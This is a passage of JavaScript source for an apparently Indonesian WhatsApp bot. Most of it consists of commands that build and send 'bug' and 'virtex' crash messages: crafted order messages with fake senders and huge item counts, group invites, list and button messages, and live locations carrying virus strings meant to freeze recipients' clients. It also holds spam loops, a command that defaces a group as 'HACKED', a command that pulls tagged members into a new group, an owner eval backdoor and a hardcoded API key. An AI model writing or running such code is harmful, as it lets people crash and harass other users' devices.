wibu.toggleDisappearingMessages(from,`AaaaGoblok`,text)
var tolol = wibu.prepareMessageFromContent(from,{
 "orderMessage": {
 "orderId": "599519108102353",
 "jpegThumbnail": fs.readFileSync('media/ranz.jpg'),
 "itemCount": 2021,
 "status": "INQUIRY",
 "surface": "CATALOG",
 "message": philips,
 "orderTitle": buttonvirus,
 "sellerJid": "6283131458282@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }, contextInfo:{}}) 
 wibu.relayWAMessage(tolol)
break
case 'jadivirtex':
if (!mek.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Teks Nya Apa Contoh\n${prefix}jadivirtex teks`)
reply('Proces Bikin Virtex!!')
wibu.sendMessage(from, `${q}${philips}`, text)
break
case 'jadibugweb':
if (!q) return reply(`Teks Nya Apa Contoh\n${prefix}jadibugweb Ranz|Link Lu`)
pe = args.join('')
top = pe.split('|')[0]
bottom = pe.split('|')[1]
wibu.sendMessage(from, top, text, { quoted: mek, contextInfo: { externalAdReply: { title: `${philips}`, body: philips, sourceUrl: bottom }}})
break
case 'jadibugpc':
					if (!mek.key.fromMe) return reply('lu siapa')
					if (!q) return reply(`Teks Nya Apa Contoh\n${prefix}jadibugpc Ranz|`)
buf = fs.readFileSync('./media/ranz.jpg')
imeu = await wibu.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await wibu.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `${q}${cvirus}`,
"jpegThumbnail": fs.readFileSync('./media/ranz.jpg')
}
}, {quoted:imeu, contextInfo:{}})
wibu.relayWAMessage(jk)
await setTimeout(() => {
reply('Berhasil Created Bug Pc')
}, 3000)
break
case 'jadibugbutton':
				if (!mek.key.fromMe) return reply('Lu siapa')
				if (!q) return reply(`Teks Nya Apa Contoh\n${prefix}jadibugbutton Ranz|`)
				gam = fs.readFileSync('./media/thumnail.jpg')
         ahageo2 = `${q} ${cvirus}`
         sasageo2 = `${q} ${ranzmods}`
		sendButtonLocation(from, `BUG BY ${q}`, 'https://youtu.be/QShjlsC5-wc', {thumbnail: gam}, [{buttonId:`${prefix}command`,buttonText:{displayText: `${ahageo2}`},type:1},{buttonId:`${prefix}id10`,buttonText:{displayText: `${sasageo2}`},type:1},{buttonId:`${prefix}id2`,buttonText:{displayText:`${ahageo2}`},type:1}], {contextInfo: { mentionedJid: [sender, `${owner}` + '@s.whatsapp.net']}})
         break
case 'virtex':
					if (!mek.key.fromMe) return reply('Lu siapa')
wibu.sendMessage(from, virtex(prefix), text)
wibu.sendMessage(from, virtex2(prefix), text)
wibu.sendMessage(from, virtex3(prefix), text)
wibu.sendMessage(from, virtex4(prefix), text)
wibu.sendMessage(from, virtex5(prefix), text)
wibu.sendMessage(from, virtex6(prefix), text)
wibu.sendMessage(from, virtex7(prefix), text)
wibu.sendMessage(from, virtex8(prefix), text)
wibu.sendMessage(from, virtex9(prefix), text)
break
 case 'bugstik':
        if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
        wibu.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                 const ara = fs.readFileSync('./media/sticker/mastah.webp')
                  wibu.sendMessage(from, ara, MessageType.sticker, {quoted: {key: {participant: '0@s.whatsapp.net' },message: {orderMessage: {itemCount: 999999999,status: 1,surface: 1,message: 'ꪶ𖣂ꫂRANZ々M5',orderTitle: 'By IMV TEAM',sellerJid: '0@s.whatsapp.net'}}}})                  
        break        
        case 'jadibuglist':
        if (!isOwner && !mek.key.fromMe) return reply(`Lu Siapa Sih`)
        wibu.toggleDisappearingMessages(from, 0)
        listMsg = {
 buttonText: cvirus,
 footerText: `${q}`,
 description: `${q}`,
 sections: [
                     {
                      "title": `${q} ${cvirus}`,
 rows: [
                          {
                              "title": `${cvirus}`,
                              "rowId": `${cvirus}`
                           }
                        ]
                     }],
 listType: 1
}
wibu.sendMessage(from, listMsg, MessageType.listMessage, {quoted: mek})
        wibu.toggleDisappearingMessages(from, 0)

break
case 'jadwaltv':
if (args.length == 0) return reply(`Nama Channel Nya Mana Tod\nContoh: ${prefix + command} SCTV`)
channel = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=ZeroYT7`)
get_result = get_result.result
ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
for (var x in get_result) {
ini_txt += `${x} - ${get_result[x]}\n`
}
reply(ini_txt)
break
case 'owner':
members_ids = []
for (let mem of groupMembers) {
members_ids.push(mem.jid)
}
vcard2 = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator ${ownername} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
wibu.sendMessage(from, {displayName: `Creator ${ownername}`, vcard: vcard2}, contact, 
{ quoted: ftrol, 
})
reply('TUHH NOMER OWNER KU')
break
case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
reply(`_Restarting ${botname}_`)
exec(`cd &&  node index`)
await replyy('Sukses')
break		
case 'bc':
if (!mek.key.fromMe) return reply('Lu siapa')
if (args.length < 1) return reply('.......')
anu = await wibu.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
bc = await wibu.downloadMediaMessage(encmedia)
for (let _ of anu) {
wibu.sendMessage(_.jid, bc, image, { caption: `[ Izin Broadcast ]\n\n${body.slice(4)}` })
}
reply('Suksess broadcast')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ *BOT BROADCAST* ]\n\n${body.slice(4)}`)
}
reply('Suksess broadcast')
}
break
case 'tobc':				
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')					
				wibu.updatePresence(from, Presence.composing)
					anu = await groupMembers
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Arya).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo :mek
						buff = await wibu.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wibu.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wibu.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wibu.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          replyy('reply sticker/audio')
							}
					break
					case 'bc2':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')      
             if (args.length < 1) return reply('teks?')
             anu = await wibu.chats.all()
             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await wibu.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             wibu.sendMessage(_.jid, bc, image, {quoted:ftrol,caption: `*『 Imv 』*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
wibu.sendMessage(_.jid, 
			{"contentText": `*『 Imv Broadcast 💫 』*\n\n${body.slice(4)}`,
			"footerText": 'RANZ M5💫',
			"buttons": [
			{"buttonId": `#menu`,
			"buttonText": {"displayText": "📙 MENU"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             replyy('Suksess broadcast')
}
             break                   
             case 'creator':
menunya = `GA USAH RENAME CUKUP LU PAKE AJA !!
`

	teks =
`
❏CREATOR BOT❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
┣🔥️Creator Bot : Ranz M5
┗━━⊱
❏NOTE❏
`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [{buttonId: `${prefix}yuuzzxgyu`, buttonText: { displayText: 'BACK TO MENU IMV BOT' }, type: 1 },]
sendButImage(from, teks, `${menunya}`, gam, but)        
break 
case 'yuuzzxgyu':
menunya = `┏━━⊱  ⋮☰ MENU
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏KAGA TAU NAMA MENUNYA❏
┣◦➛⿻ ${prefix}menu/help
┣◦➛⿻ ${prefix}modebot
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏JADI BOT MENU❏
┣◦➛⿻ ${prefix}jadibot
┣◦➛⿻ ${prefix}stopjadibot
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏TOOLS MENU❏
┣◦➛⿻ ${prefix}sticker
┣◦➛⿻ ${prefix}attp
┣◦➛⿻ ${prefix}toimg
┣◦➛⿻ ${prefix}tomp3
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏RANDOM MENU❏
┣◦➛⿻ ${prefix}detikvn
┣◦➛⿻ ${prefix}detikvideo
┣◦➛⿻ ${prefix}tourl
┣◦➛⿻ ${prefix}kodenuklir
┣◦➛⿻ ${prefix}linkbokep
┣◦➛⿻ ${prefix}artinama
┣◦➛⿻ ${prefix}jodoh
┣◦➛⿻ ${prefix}jadian
┣◦➛⿻ ${prefix}jadwaltv
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏OWNER❏
┣◦➛⿻ ${prefix}owner
┣◦➛⿻ ${prefix}upswteks
┣◦➛⿻ ${prefix}upswvn
┣◦➛⿻ ${prefix}upswaudio
┣◦➛⿻ ${prefix}upswsticker
┣◦➛⿻ ${prefix}upswimage
┣◦➛⿻ ${prefix}upswvideo
┣◦➛⿻ ${prefix}bc2
┣◦➛⿻ ${prefix}tobc
┣◦➛⿻ ${prefix}set
┣◦➛⿻ ${prefix}bc
┣◦➛⿻ ${prefix}spam
┣◦➛⿻ ${prefix}spamsw
┣◦➛⿻ ${prefix}culik
┣◦➛⿻ ${prefix}restart
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏MUSIC❏
┣◦➛⿻ ${prefix}music1
┣◦➛⿻ ${prefix}music2
┣◦➛⿻ ${prefix}music3
┣◦➛⿻ ${prefix}music4
┣◦➛⿻ ${prefix}music5
┣◦➛⿻ ${prefix}music6
┣◦➛⿻ ${prefix}music7
┣◦➛⿻ ${prefix}music8
┣◦➛⿻ ${prefix}music9
┣◦➛⿻ ${prefix}music10
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏GROUP MENU❏
┣◦➛⿻ ${prefix}group open/close
┣◦➛⿻ ${prefix}promote
┣◦➛⿻ ${prefix}demote
┣◦➛⿻ ${prefix}add
┣◦➛⿻ ${prefix}kick
┣◦➛⿻ ${prefix}hidetag
┣◦➛⿻ ${prefix}tagall
┣◦➛⿻ ${prefix}sticktag
┣◦➛⿻ ${prefix}imgtag
┣◦➛⿻ ${prefix}videotag
┣◦➛⿻ ${prefix}setname
┣◦➛⿻ ${prefix}setdesc
┣◦➛⿻ ${prefix}setpp
┣◦➛⿻ ${prefix}hacked
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏BUG-BUG OLD❏
┣◦➛⿻ ${prefix}bugbutton
┣◦➛⿻ ${prefix}bugpc
┣◦➛⿻ ${prefix}bugweb
┣◦➛⿻ ${prefix}buglist
┣◦➛⿻ ${prefix}bugstik
┣◦➛⿻ ${prefix}buggif
┣◦➛⿻ ${prefix}lokas
┣◦➛⿻ ${prefix}virgamv1
┣◦➛⿻ ${prefix}virgamv2
┣◦➛⿻ ${prefix}document
┣◦➛⿻ ${prefix}pdf
┣◦➛⿻ ${prefix}virtag
┣◦➛⿻ ${prefix}virtex
┣◦➛⿻ ${prefix}virkon
┣◦➛⿻ ${prefix}trolicard
┣◦➛⿻ ${prefix}livelokas
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣   ❏CREATE BUG OLD❏
┣◦➛⿻ ${prefix}jadicatalog <Tag Gambar> <Teks>
┣◦➛⿻ ${prefix}jadivirgamv1 <Tag Gambar>
┣◦➛⿻ ${prefix}jadivirgamv2 <Tag Gambar>
┣◦➛⿻ ${prefix}tovirgamv1 <Tag Sticker>
┣◦➛⿻ ${prefix}tovirgamv2 <Tag Sticker>
┣◦➛⿻ ${prefix}jadivirvidv1 <Tag Video>
┣◦➛⿻ ${prefix}jadivirvidv2 <Tag Video>
┣◦➛⿻ ${prefix}jadidocument <Teks>
┣◦➛⿻ ${prefix}jadipdf <Teks>
┣◦➛⿻ ${prefix}jadilocation <Teks>
┣◦➛⿻ ${prefix}jadivirtex <Teks>
┣◦➛⿻ ${prefix}jadibugpc <Teks>
┣◦➛⿻ ${prefix}jadibugbutton <Teks>
┣◦➛⿻ ${prefix}jadibuglist <Teks>
┣◦➛⿻ ${prefix}jadivirkon <Nomer|Teks>
┣◦➛⿻ ${prefix}jadibugweb <Teks|Url>
┣◦➛⿻ ${prefix}jadilivelokas <Teks>
┣◦➛⿻ ${prefix}jaditrolicard <Teks>
┣
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┣
┣BEYOUR SELF BY NEVER SURENDER ♥️
┣
┣▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┗━━━━━━━━━━━━━━━━━━━━━⊱
BY RANZ M5彡
`

	teks =
`
❏INFO USER❏
┏━━⊱ 
┣🔥️Nama User : ${pushname}
┣🔥️Nomer User : ${sender.split("@")[0]}
┗━━⊱
❏TO DAY❏
┏━━⊱ 
┣🔥️${tampilUcapan}
┣🔥️Jam : ${time}
┗━━⊱
❏NOTE❏
┏━━⊱ 
┣🔥️Menu Bot Di Bawah
┣🔥️Jika Bot Tidak Merespon Berarti Bot Sedang Reconnect Atau Sedang Menghubungkan Kembali!!
┗━━⊱
`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [{buttonId: `${prefix}developer`, buttonText: { displayText: '⎙ DEVELOPER' }, type: 1 },{buttonId: `${prefix}creator`, buttonText: { displayText: '⎙ CREATOR' }, type: 1 },]
sendButImage(from, teks, `${menunya}`, gam, but)        
break 
case 'hidetag':
			  if (!mek.key.fromMe) return reply('Lu siapa')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await wibu.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			wibu.sendMessage(from, optionshidetag, text)
			break
case 'sticktag':
			 if (!mek.key.fromMe) return reply('Lu siapa')
            if (!mek.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await wibu.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await wibu.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wibu.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
case 'imgtag':
			 if (!mek.key.fromMe) return reply('Lu siapa')
            if (!mek.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await wibu.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await wibu.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wibu.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply Gambar yang sudah dikirim*`)
            }
            break
case 'videotag':
			 if (!mek.key.fromMe) return reply('Lu siapa')
            if (!mek.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await wibu.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await wibu.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wibu.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply Video yang sudah dikirim*`)
            }
            break
case 'upswteks':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    wibu.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswvn':            
					if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')	       
if (!isQuotedAudio) return reply('Reply Vn Nya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wibu.downloadMediaMessage(encmedia)
						wibu.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break

case 'upswaudio':
                     if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wibu.downloadMediaMessage(encmedia)
						wibu.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
case 'upswsticker':                    
                    if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wibu.downloadMediaMessage(encmedia)
						wibu.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
case 'upswvideo':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await wibu.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    wibu.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
case 'upswimage':                       
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await wibu.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    wibu.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    replyy(`Sukses upload image:\n${teksyy}`)
                        break        
                        case 'infoall': case 'tagall':
                        if (!mek.key.fromMe) return reply('Lu siapa')
						     if (!isGroup) return reply(mess.only.group)
									var nom = mek.participant
									members_id = []
									teks = ''
									for (let mem of groupMembers) {
										teks += `│ *@${mem.jid.split('@')[0]}*\n`
										members_id.push(mem.jid)
										}
										mentions(`「 *TAG ALL*  」
${q?`\nPesan : `+q:``}
							
${teks}`, members_id, true)
									break
case 'setname':
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
wibu.groupUpdateSubject(from, `${body.slice(9)}`)
wibu.sendMessage(from, `\`\`\`✓Sukses Mengganti Nama Group Menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setdesc':
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
wibu.groupUpdateDescription(from, `${body.slice(9)}`)
wibu.sendMessage(from, `\`\`\`✓Sukses Mengganti Deskripsi Group\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setpp':
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (!isQuotedImage) return reply('Reply Gambar!')
if ((isMedia || isQuotedImage ) && args.length == 0) 
cokmate = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
media = await wibu.downloadAndSaveMediaMessage(cokmate)
await wibu.updateProfilePicture(from, media)
reply(mess.wait)
reply(`\`\`\`✓Sukses Mengganti Profil Group\`\`\` *${groupMetadata.subject}*`)
break
case 'attp':
if (args.length == 0) return reply(`Example: ${prefix + command} Woy`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
wibu.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'toimg': 
											reply(mess.wait)
									if (!isQuotedSticker) return reply('Reply stiker Lord')
									if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker && args.length == 0)) {
										encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await wibu.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.png')
										exec(`ffmpeg -i ${media} ${ran}`, (err) => {
											fs.unlinkSync(media)
											if (err) return reply('❎ Gagal, pada saat mengkonversi sticker ke gambar ❎')
											buffer = fs.readFileSync(ran)
											wibu.sendMessage(from, buffer, image, {caption:'Sukses Lord',quoted:mek})
											fs.unlinkSync(ran)
											})
										} else {
											reply(`Reply Stiker Nya Lord`)
										}
									break
case 'tomp3':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await wibu.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            wibu.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
case 'hacked':
 if (!mek.key.fromMe) return reply('Lu siapa')
              if (!isGroup) return reply('??')
              reply('Otw Hack')
                tessgc = fs.readFileSync('media/thumnail.jpg')
                   wibu.updateProfilePicture (from, tessgc)
                wibu.groupUpdateSubject(from, `HACKED BY IMV BOTZ`)
                wibu.groupUpdateDescription(from, `_Ranz Botz Telah Berhasil Meretas_`)             
                await wibu.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
case 'spamsw':
if (!mek.key.fromMe) return reply('Lu siapa')
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					wibu.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    replyy('Sukses')
                    break	
                    case 'culik':
		if (!mek.key.fromMe) return reply('Lu siapa')
			if (!isGroup) return reply('??')
				if (args.length < 1) return reply(`Penggunaan ${prefix}culik nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					wibu.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				break
case 'spam':
                    if (!mek.key.fromMe) return reply(mess.me)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argsi = arg.split("|")
				if (!argsi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argsi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argsi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argsi[1]; i++){
					wibu.sendMessage(from, argsi[0], MessageType.text)
				}
				break
case 'jadibot': 
          if (mek.key.fromMe) return reply('Tidak bisa jadibot di dalam bot');
        jadibot(reply, wibu, from);
        break; 
        case 'stopjadibot':
        if (mek.key.fromMe)
          return reply('tidak bisa stopjadibot kecuali owner');
        stopjadibot(reply);
        break;
        case 'buggif': 
				          case 'gif':
nicko = fs.readFileSync('./media/gif.gif')
					wibu.sendMessage(from,nicko,video, {mimetype: Mimetype.gif, thumbnail: fs.readFileSync("database/virtex/white.jpg"),quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
					break
case 'livelokas':            
if (!mek.key.fromMe) return reply('Lu siapa')
            res = await wibu.prepareMessageFromContent(from,{
				"liveLocationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411,
						"caption": `RANZ-M5${philips}`,
						"sequenceNumber": "1632077323798001",
					"thumbnail": fs.readFileSync('media/ranz.jpg'),
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": false
    }
  }
}, {quoted: mek, contextInfo:{}}) 
wibu.relayWAMessage(res)
break
case 'jadilivelokas':            
if (!mek.key.fromMe) return reply('Lu siapa')
if (!q) return reply(`Teks Nya Apa Contoh\n${prefix}jadilivelokas Ranz|`)
            res = await wibu.prepareMessageFromContent(from,{
				"liveLocationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411,
						"caption": `${q}${philips}`,
						"sequenceNumber": "1632077323798001",
					"thumbnail": fs.readFileSync('media/ranz.jpg'),
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": false
    }
  }
}, {quoted: mek, contextInfo:{}}) 
wibu.relayWAMessage(res)
break
case 'jaditrolicard':
if (!q) return reply(`Teks Nya Apa Contoh\n${prefix}jaditrolicard Ranz|`)
var tolol = wibu.prepareMessageFromContent(from,{
 "orderMessage": {
 "orderId": "599519108102353",
 "jpegThumbnail": fs.readFileSync('media/ranz.jpg'),
 "itemCount": 2021,
 "status": "INQUIRY",
 "surface": "CATALOG",
 "message": `${q}${philips}`,
 "orderTitle": `${q}${cvirus}`,
 "sellerJid": "6283131458282@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }, contextInfo:{}}) 
 wibu.relayWAMessage(tolol)
break
default:
if (isOwner) {
			if (budy.startsWith('>')) {
				console.log(color('[EVAL1]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					reply(`${evaled}`)
				} catch (err) {
					reply(`${err}`)
				}
			} else if (budy.startsWith('x')) {
				console.log(color('[EVAL2]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
				try {
					return wibu.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: ftrol })
				} catch (err) {
					e = String(err)
					reply(e)
				}
			}
		}
		}
		fin = process.uptime()
        if (!mek.hasNewMessage) return wibu.setStatus(`Runtime ${runtime(process.uptime())} | prefix ${prefix} | ${runtimebio}`)
        mek = mek.messages.all()[0]
	} catch (e) {
    e = String(e)
